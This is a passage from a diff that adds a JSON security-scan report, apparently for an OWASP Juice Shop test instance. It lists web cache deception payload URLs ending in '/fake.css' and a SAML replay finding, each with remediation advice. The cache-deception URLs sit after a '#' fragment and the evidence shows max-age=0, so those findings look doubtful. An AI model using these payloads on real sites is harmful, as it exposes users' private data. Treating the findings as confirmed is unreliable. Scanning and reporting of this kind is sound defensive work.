+      "detail": "Authenticated path '/account' is accessible as '/fake.css' and may be cached. An attacker can trick authenticated users to visit this URL, caching their private data for unauthenticated retrieval.",
+      "evidence": "Cache-Control: public, max-age=0 | X-Cache:  | Status: 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Set Cache-Control: no-store on all authenticated responses. Configure CDN to not cache URLs matching authenticated paths. Validate request path ends with expected extension."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/dashboard/fake.css",
+      "type": "Web Cache Deception \u2014 Sensitive Path Cacheable",
+      "severity": "high",
+      "cvss": 7.5,
+      "payload": "https://juiceshop.akto.io/#/dashboard/fake.css",
+      "detail": "Authenticated path '/dashboard' is accessible as '/fake.css' and may be cached. An attacker can trick authenticated users to visit this URL, caching their private data for unauthenticated retrieval.",
+      "evidence": "Cache-Control: public, max-age=0 | X-Cache:  | Status: 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Set Cache-Control: no-store on all authenticated responses. Configure CDN to not cache URLs matching authenticated paths. Validate request path ends with expected extension."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/user/fake.css",
+      "type": "Web Cache Deception \u2014 Sensitive Path Cacheable",
+      "severity": "high",
+      "cvss": 7.5,
+      "payload": "https://juiceshop.akto.io/#/api/user/fake.css",
+      "detail": "Authenticated path '/api/user' is accessible as '/fake.css' and may be cached. An attacker can trick authenticated users to visit this URL, caching their private data for unauthenticated retrieval.",
+      "evidence": "Cache-Control: public, max-age=0 | X-Cache:  | Status: 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Set Cache-Control: no-store on all authenticated responses. Configure CDN to not cache URLs matching authenticated paths. Validate request path ends with expected extension."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/settings/fake.css",
+      "type": "Web Cache Deception \u2014 Sensitive Path Cacheable",
+      "severity": "high",
+      "cvss": 7.5,
+      "payload": "https://juiceshop.akto.io/#/settings/fake.css",
+      "detail": "Authenticated path '/settings' is accessible as '/fake.css' and may be cached. An attacker can trick authenticated users to visit this URL, caching their private data for unauthenticated retrieval.",
+      "evidence": "Cache-Control: public, max-age=0 | X-Cache:  | Status: 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Set Cache-Control: no-store on all authenticated responses. Configure CDN to not cache URLs matching authenticated paths. Validate request path ends with expected extension."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/saml/consume",
+      "type": "SAML \u2014 Replay Attack Possible (No Assertion ID Tracking)",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "The same SAMLResponse was accepted twice. SAML Assertion ID is not tracked \u2014 replay attacks possible.",
+      "evidence": "Both requests returned HTTP 200",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Track and reject previously seen SAML Assertion IDs. Enforce NotOnOrAfter."
+    }
+  ],
+  "start_time": "2026-05-20T14:42:51.909240"
+}
